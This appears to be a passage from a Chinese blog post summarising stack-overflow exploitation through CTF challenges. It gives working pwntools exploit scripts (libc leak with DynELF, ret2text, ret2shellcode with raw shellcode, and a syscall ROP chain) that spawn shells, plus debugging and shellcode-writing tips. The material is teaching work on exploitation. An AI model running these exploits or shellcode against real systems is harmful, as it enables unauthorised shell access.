<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">p = process(<span class="string">'./xxx'</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span><span class="params">(address)</span>:</span></span><br><span class="line">  <span class="comment">#各种预处理</span></span><br><span class="line">  payload = <span class="string">"xxxxxxxx"</span> + address + <span class="string">"xxxxxxxx"</span></span><br><span class="line">  p.send(payload)</span><br><span class="line">  <span class="comment">#各种处理</span></span><br><span class="line">  data = p.recv(<span class="number">4</span>)</span><br><span class="line">  log.debug(<span class="string">"%#x =&gt; %s"</span> % (address, (data <span class="keyword">or</span> <span class="string">''</span>).encode(<span class="string">'hex'</span>)))</span><br><span class="line">  <span class="keyword">return</span> data</span><br><span class="line">d = DynELF(leak, elf=ELF(<span class="string">"./xxx"</span>))      <span class="comment">#初始化DynELF模块 </span></span><br><span class="line">systemAddress = d.lookup(<span class="string">'system'</span>, <span class="string">'libc'</span>)  <span class="comment">#在libc文件中搜索system函数的地址</span></span><br></pre></td></tr></table></figure>

<p> 这里构造payload为 <code>payload = &#39;A&#39;*0x88+&#39;BBBB&#39;+p32(plt_write)+p32(addr_func)+p32(1) + p32(address) + p32(length)</code> ， 就可以泄漏<code>address</code>的地址。  知道了<code>address</code>的地址的话就简单很多了，只需要先用<code>read</code>在<code>bbs</code>写入<code>/bin/sh</code>然后再调用<code>system</code>就可以了 </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = remote(<span class="string">'pwn2.jarvisoj.com'</span>, <span class="number">9880</span>)</span><br><span class="line">elf = ELF(<span class="string">'./level4'</span>)</span><br><span class="line">padding = <span class="string">'a'</span> * (<span class="number">0x88</span> + <span class="number">0x4</span>)</span><br><span class="line">write_addr = elf.plt[<span class="string">'write'</span>]</span><br><span class="line">main_addr = elf.symbols[<span class="string">'main'</span>]</span><br><span class="line">read_addr = elf.plt[<span class="string">'read'</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span><span class="params">(addr)</span>:</span></span><br><span class="line">	payload = padding</span><br><span class="line">	payload += p32(write_addr)</span><br><span class="line">	payload += p32(main_addr)</span><br><span class="line">	payload += p32(<span class="number">1</span>) + p32(addr) + p32(<span class="number">4</span>)</span><br><span class="line">	r.sendline(payload)</span><br><span class="line">	leak_addr = r.recv(<span class="number">4</span>)</span><br><span class="line">	<span class="keyword">return</span> leak_addr</span><br><span class="line"></span><br><span class="line">d = DynELF(leak,elf = ELF(<span class="string">'./level4'</span>))</span><br><span class="line">system_addr = d.lookup(<span class="string">'system'</span>,<span class="string">'libc'</span>)</span><br><span class="line">print(hex(system_addr))</span><br><span class="line"></span><br><span class="line">bss_addr = elf.bss()</span><br><span class="line">payload1 = padding</span><br><span class="line">payload1 += p32(read_addr)</span><br><span class="line">payload1 += p32(system_addr)</span><br><span class="line">payload1 += p32(<span class="number">0</span>) + p32(bss_addr) + p32(<span class="number">8</span>)</span><br><span class="line">payload1 += p32(bss_addr)</span><br><span class="line"></span><br><span class="line">r.sendline(payload1)</span><br><span class="line">r.sendline(<span class="string">'/bin/sh\0'</span>)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>

<p><img src="/2019/11/14/%E6%A0%88%E6%BA%A2%E5%87%BA%E6%80%BB%E7%BB%93/image-20191116151651796.png" alt="image-20191116151651796"></p>
<h3 id="CTF-WIKI-ret2text"><a href="#CTF-WIKI-ret2text" class="headerlink" title="CTF-WIKI-ret2text"></a>CTF-WIKI-ret2text</h3><p><img src="/2019/11/14/%E6%A0%88%E6%BA%A2%E5%87%BA%E6%80%BB%E7%BB%93/image-20191117203353833.png" alt="image-20191117203353833"></p>
<p>开启了NX保护，32位的程序。</p>
<p><img src="/2019/11/14/%E6%A0%88%E6%BA%A2%E5%87%BA%E6%80%BB%E7%BB%93/image-20191117203548911.png" alt="image-20191117203548911"></p>
<p><code>gets</code>函数溢出</p>
<p><img src="/2019/11/14/%E6%A0%88%E6%BA%A2%E5%87%BA%E6%80%BB%E7%BB%93/image-20191117203712027.png" alt="image-20191117203712027"></p>
<p>在<code>secure()</code>函数中发现了<code>system(&quot;/bin/sh&quot;);</code></p>
<p>我们可以直接构造使程序跳转到此处进行获取<code>shell</code></p>
<p><img src="/2019/11/14/%E6%A0%88%E6%BA%A2%E5%87%BA%E6%80%BB%E7%BB%93/image-20191117203913615.png" alt="image-20191117203913615"></p>
<p>可以看到程序是<code>esp</code>的索引，开始调试一下。</p>
<p>在<code>.text:080486AE                 call    _gets</code>处下断点。</p>
<p><img src="/2019/11/14/%E6%A0%88%E6%BA%A2%E5%87%BA%E6%80%BB%E7%BB%93/image-20191117204652420.png" alt="image-20191117204652420"></p>
<p><code>esp是0xffffceb0</code></p>
<p><code>ebp是0xffffcf38</code></p>
<p><code>s对于esp是esp+1Ch</code></p>
<p>我们可以得出s是<code>0xFFFFCECC</code>，然后ebp-s得到s相对于ebp的偏移是<code>6ch</code>，覆盖到ebp就是<code>0x6c+4</code></p>
<p>最后得到payload：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">'./ret2text'</span>)</span><br><span class="line">call_bash = <span class="number">0x0804863A</span></span><br><span class="line">p.sendline(<span class="string">'A'</span> * (<span class="number">0x6c</span>+<span class="number">4</span>) + p32(call_bash))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>



<h3 id="ret2shellcode"><a href="#ret2shellcode" class="headerlink" title="ret2shellcode"></a>ret2shellcode</h3><p><strong>原理：</strong></p>
<blockquote>
<p>ret2shellcode，即控制程序执行 shellcode 代码。shellcode 指的是用于完成某个功能的汇编代码，常见的功能主要是获取目标系统的 shell。<strong>一般来说，shellcode 需要我们自己填充。这其实是另外一种典型的利用方法，即此时我们需要自己去填充一些可执行的代码</strong>。 </p>
</blockquote>
<p> 在栈溢出的基础上，要想执行 shellcode，需要对应的 binary 在运行时，shellcode 所在的区域具有可执行权限。 </p>
<p>我们打开题目</p>
<p><img src="/2019/11/14/%E6%A0%88%E6%BA%A2%E5%87%BA%E6%80%BB%E7%BB%93/image-20200103134449648.png" alt="image-20200103134449648"></p>
<p>可以看到有两条<code>puts</code>输出语句，还有两条<code>fgets</code>获取输入</p>
<p>其中<code>name</code>是在<code>bss</code>段，<code>s</code>是在栈上，那么我们可以把<code>Shellcode</code>写在<code>bss</code>段，然后构造栈溢出让<code>EIP</code>去<code>bss</code>段执行。</p>
<p>exp:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = remote(<span class="string">'xxxxxxxxx'</span>,xxxx)</span><br><span class="line">bss_addr = <span class="number">0x0804A080</span></span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">r.recvuntil(<span class="string">'Name:'</span>)</span><br><span class="line">r.sendline(shellcode)</span><br><span class="line">payload =p32(bss_addr)*<span class="number">0x100</span></span><br><span class="line">r.recvuntil(<span class="string">'message:'</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>

<p><img src="/2019/11/14/%E6%A0%88%E6%BA%A2%E5%87%BA%E6%80%BB%E7%BB%93/image-20200103134842157.png" alt="image-20200103134842157"></p>
<h3 id="ret2shellcode-64"><a href="#ret2shellcode-64" class="headerlink" title="ret2shellcode_64"></a>ret2shellcode_64</h3><p>原理相同</p>
<p>shellcode：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shellcode =  <span class="string">'\x48\x31\xff\x48\x31\xc0\xb0\x69\x0f\x05\x48\x31\xd2\x48\xbb\xff\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x48\x31\xc0\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05'</span></span><br></pre></td></tr></table></figure>

<h3 id="ret2sys-32"><a href="#ret2sys-32" class="headerlink" title="ret2sys_32"></a>ret2sys_32</h3><p>打开题目</p>
<p><img src="/2019/11/14/%E6%A0%88%E6%BA%A2%E5%87%BA%E6%80%BB%E7%BB%93/image-20200103140958469.png" alt="image-20200103140958469"></p>
<p>这里应该存在溢出，来调试一下</p>
<p><img src="/2019/11/14/%E6%A0%88%E6%BA%A2%E5%87%BA%E6%80%BB%E7%BB%93/image-20200103141132291.png" alt="image-20200103141132291"></p>
<p>44个字节直接覆盖到了eip，那么我们来找一下gadget</p>
<p><img src="/2019/11/14/%E6%A0%88%E6%BA%A2%E5%87%BA%E6%80%BB%E7%BB%93/image-20200103141455130.png" alt="image-20200103141455130"></p>
<p>三处连续<code>pop | ret</code></p>
<p><img src="/2019/11/14/%E6%A0%88%E6%BA%A2%E5%87%BA%E6%80%BB%E7%BB%93/image-20200103141537333.png" alt="image-20200103141537333"></p>
<p>找到<code>int 0x80 ret</code></p>
<p><img src="/2019/11/14/%E6%A0%88%E6%BA%A2%E5%87%BA%E6%80%BB%E7%BB%93/image-20200103141636321.png" alt="image-20200103141636321"></p>
<p>现在的问题是，我们没有<code>/bin/sh</code>字符串，那么我们可以利用系统调用的方式来构造一个<code>read</code>先去写在程序的<code>bss</code>段一个<code>/bin/sh</code></p>
<p><img src="/2019/11/14/%E6%A0%88%E6%BA%A2%E5%87%BA%E6%80%BB%E7%BB%93/image-20200103141936952.png" alt="image-20200103141936952"></p>
<p>那么我们现在的问题就是要去堆这个<code>ROP</code>链，去先<code>read</code>到<code>sh</code>进<code>bss</code>段里面，然后去调用<code>execve</code></p>
<p><img src="/2019/11/14/%E6%A0%88%E6%BA%A2%E5%87%BA%E6%80%BB%E7%BB%93/image-20200103142306241.png" alt="image-20200103142306241"></p>
<p><img src="/2019/11/14/%E6%A0%88%E6%BA%A2%E5%87%BA%E6%80%BB%E7%BB%93/image-20200103142343011.png" alt="image-20200103142343011"></p>
<p>exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sh = remote(<span class="string">'xxx'</span>,xxxx)</span><br><span class="line">int_0x80 = <span class="number">0x0806F350</span></span><br><span class="line">pop_eax = <span class="number">0x080bb2c6</span></span><br><span class="line">pop_ebx_ecx_edx = <span class="number">0x0806ecb0</span></span><br><span class="line">buf = <span class="number">0x080EAF80</span></span><br><span class="line">payload = <span class="string">'A'</span>*(<span class="number">0x28</span>+<span class="number">0x4</span>)</span><br><span class="line">payload += flat([pop_eax,<span class="number">0x03</span>,pop_ebx_ecx_edx,<span class="number">50</span>,buf,<span class="number">1</span>,int_0x80,pop_eax,<span class="number">0xb</span>,pop_ebx_ecx_edx,<span class="number">0</span>,<span class="number">0</span>,buf,int_0x80])</span><br><span class="line">sh.recvuntil(<span class="string">'system?'</span>)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">sh.sendline(<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<p><img src="/2019/11/14/%E6%A0%88%E6%BA%A2%E5%87%BA%E6%80%BB%E7%BB%93/image-20200103142445144.png" alt="image-20200103142445144"></p>
<h3 id="ret2sys-64"><a href="#ret2sys-64" class="headerlink" title="ret2sys_64"></a>ret2sys_64</h3><h3 id="技巧"><a href="#技巧" class="headerlink" title="技巧"></a>技巧</h3><ul>
<li><p>ncat</p>
<ul>
<li>建立local service环境</li>
<li><code>ncat -vc ./shellcode -kl 127.0.0.1 8888</code></li>
<li><code>ncat -vc &#39;strace -e trace=read  ./shellcode&#39; -kl ::1 4000</code></li>
</ul>
</li>
<li><p>readelf</p>
<ul>
<li><code>readelf -a /lib/i386-linux-gnu/libc.so.6 | grep &#39; printf@&#39;</code></li>
<li><code>readelf -a ret2shellcode_32  | grep STACK</code></li>
</ul>
</li>
<li><p>GDB</p>
<ul>
<li>ni：单步步过</li>
<li>si：单步步入</li>
<li>c：运行到下一个断点</li>
<li>fin：会根据bt（断点）的结果，调到<code>return</code>的位置</li>
<li>x/wx 0x804a040：dump一个word 16进制</li>
<li>x/10wx 0x804a040：dump十个word 16进制</li>
<li>x/7i 0x804a040：看7条指令</li>
<li>x/s 0x804a040：看字符串</li>
<li>attach：<ul>
<li>先查看进程id：<code>pidof shellcode</code></li>
<li>进入gdb，<code>attach PID</code></li>
<li>如果不能attach的话，执行：<code>echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope</code></li>
</ul>
</li>
</ul>
</li>
<li><p>Hook&amp;Patch</p>
<ul>
<li><p>关掉alarm</p>
<ul>
<li><p><code>sed -i s/alarm/isnan/g ./shellcode</code></p>
</li>
<li><p><code>ltrace ./shelllcode</code>查看是否还有<code>alarm</code></p>
</li>
<li><p><code>hook alarm by LD_PRELOAD</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//hook.c</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">alarm</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> seconds)</span></span>&#123;<span class="built_in">printf</span>(<span class="string">"%d\n"</span>,seconds);&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// gcc hook.c -o hook.so -shared -fPIC -m32(如果需要64位去掉-m32即可)</span></span><br><span class="line"><span class="comment">// LD_PRELOAD=./hook.so ./shellcode</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>这种hook的方式是有局限性的，只有<code>file shellcode</code>之后，出现了<code>dynamically linked</code>的时候才可以这样hook，如果没有，那么证明这个程序是将库编译进入程序的。</p>
</li>
<li><p>LD_SHOW_AUXV</p>
<ul>
<li><code>LD_SHOW_AUXV=1 ./shellcode</code></li>
<li>可以和ncat一起用，这样就可以在写exploit的时候看起来很方便。</li>
</ul>
</li>
</ul>
</li>
<li><p>qira</p>
<ul>
<li><code>qira -s ./shellcode</code></li>
</ul>
</li>
<li><p>pwntools</p>
<ul>
<li><p>python2 library &amp; toolkit</p>
</li>
<li><p>pip install pwntools</p>
</li>
<li><p>tube,asm,disasm,DynELF,shellcraft</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#print enhex(asm('mov eax,ebx'))#89d8</span></span><br><span class="line"><span class="comment">#print disasm(unhex('58'))#pop eax</span></span><br><span class="line">r = remote(<span class="string">'127.0.0.1'</span>,<span class="number">8888</span>)</span><br><span class="line">r.recvuntil(<span class="string">'name'</span>)<span class="comment">#出现name后再send</span></span><br><span class="line">r.sendline(shellcode)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
</ul>
</li>
<li><p>nasm</p>
<ul>
<li><p>x86 assembler 编译shellcode</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">nasm -felf32 shell.<span class="keyword">asm</span> -o shell.o</span><br><span class="line">ld -melf_i386 shell.o <span class="number">0</span>o shell</span><br><span class="line">objcopy -O binary shell.o shell.bin</span><br><span class="line">objdump -b binary -m i386 -D shell.bin</span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
<li><p>Alphanumeric Shellcode</p>
<ul>
<li><p>只使用A-Za-z0-9写shellcode</p>
</li>
<li><p><code>int 0x80 = \xcd\x80</code></p>
<p>怎么做<code>system call?</code></p>
</li>
<li><p>自修改</p>
<p><code>|decoder1(修复坏字节)|encoded decoder2(有坏字节)|encoded shellcode</code></p>
</li>
<li><p>Opcode Table</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">0  30 41 42             xor   BYTE PTR [ecx+0x42],al</span><br><span class="line">4  34 41                xor   al,0x41</span><br><span class="line">8  38 41 42             cmp   cmp BYTE PTR [ecx+0x42],al</span><br><span class="line">a  61                   popa</span><br><span class="line">A  41                   inc   ecx</span><br><span class="line">H  48                   dec   eax</span><br><span class="line">P  50                   push  eax</span><br><span class="line">X  58                   pop   eax</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> string.letters+string.digits:</span><br><span class="line">    <span class="keyword">print</span> x,disasm(x+<span class="string">'ABCDEFG'</span>).split(<span class="string">'\n'</span>)[<span class="number">0</span>][<span class="number">6</span>:]</span><br></pre></td></tr></table></figure>
</li>
<li><p>Register 赋值</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">PQRSTUVWa</span><br><span class="line">   0:    50                push   eax</span><br><span class="line">   1:    51                push   ecx</span><br><span class="line">   2:    52                push   edx</span><br><span class="line">   3:    53                push   ebx </span><br><span class="line">   4:    54                push   esp</span><br><span class="line">   5:    55                push   ebp</span><br><span class="line">   6:    56                push   esi</span><br><span class="line">   7:    57                push   edi</span><br><span class="line">   8:    61                popa</span><br></pre></td></tr></table></figure>
</li>
<li><p>取Shellcode位置：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">LLLLY(assumed we return to shellcode)</span><br><span class="line">   0:   4c                   dec    esp</span><br><span class="line">   1:   4c                   dec    esp</span><br><span class="line">   2:   4c                   dec    esp</span><br><span class="line">   3:   4c                   dec    esp</span><br><span class="line">   4:   59                   pop    ecx</span><br></pre></td></tr></table></figure>
</li>
<li><p>eax赋值</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0:   6a  44                   push    0x44</span><br><span class="line">2:   58                       pop     eax</span><br><span class="line">3:   34  43                   xor     al,0x43</span><br></pre></td></tr></table></figure>

</li>
</ul>
</li>
</ul>

            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
            <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="true">
                <source type="audio/mpeg" src="">
            </audio>
            
                <ul id="audio-list" style="display:none">
                    
                        
                            <li title='0' data-url='https://link.hhtjim.com/163/1363948882.mp3'></li>
                        
                    
                </ul>
            
        </div>
        
    <div id='gitalk-container' class="comment link"
        data-ae='false'
        data-ci=''
        data-cs=''
        data-r=''
        data-o=''
        data-a=''
        data-d='false'
    >查看评论</div>


    </div>
    
</div>


    </div>
</div>
</body>
<script src="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
<script src="//lib.baomitu.com/jquery/1.8.3/jquery.min.js"></script>
<script src="/js/plugin.js"></script>
<script src="/js/diaspora.js"></script>
<link rel="stylesheet" href="/photoswipe/photoswipe.css">
<link rel="stylesheet" href="/photoswipe/default-skin/default-skin.css">
<script src="/photoswipe/photoswipe.min.js"></script>
<script src="/photoswipe/photoswipe-ui-default.min.js"></script>

<!-- Root element of PhotoSwipe. Must have class pswp. -->
<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
    <!-- Background of PhotoSwipe. 
         It's a separate element as animating opacity is faster than rgba(). -->
    <div class="pswp__bg"></div>
    <!-- Slides wrapper with overflow:hidden. -->
    <div class="pswp__scroll-wrap">
        <!-- Container that holds slides. 
            PhotoSwipe keeps only 3 of them in the DOM to save memory.
            Don't modify these 3 pswp__item elements, data is added later on. -->
        <div class="pswp__container">
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
        </div>
        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
        <div class="pswp__ui pswp__ui--hidden">
            <div class="pswp__top-bar">
                <!--  Controls are self-explanatory. Order can be changed. -->
                <div class="pswp__counter"></div>
                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
                <button class="pswp__button pswp__button--share" title="Share"></button>
                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
                <!-- element will get class pswp__preloader--active when preloader is running -->
                <div class="pswp__preloader">
                    <div class="pswp__preloader__icn">
                      <div class="pswp__preloader__cut">
                        <div class="pswp__preloader__donut"></div>
                      </div>
                    </div>
                </div>
            </div>
            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
                <div class="pswp__share-tooltip"></div> 
            </div>
            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
            </button>
            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
            </button>
            <div class="pswp__caption">
                <div class="pswp__caption__center"></div>
            </div>
        </div>
    </div>
</div>




</html>
